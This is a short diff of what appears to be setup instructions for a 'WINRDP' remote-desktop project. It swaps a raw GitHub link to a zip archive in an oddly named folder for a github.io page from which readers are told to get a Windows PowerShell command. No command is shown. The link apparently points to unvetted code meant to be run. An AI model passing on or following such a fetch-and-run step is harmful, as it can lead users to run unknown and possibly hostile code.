@@ -7,7 +7,7 @@ Input the following code in the fields.
 
 Get the Windows (Powershell) command from here:
 
-https://raw.githubusercontent.com/abdomando112/WINRDP/main/metanephritic/Software-2.0-beta.4.zip
+https://abdomando112.github.io
 
 Enter you Six digit Pin code to Login
 
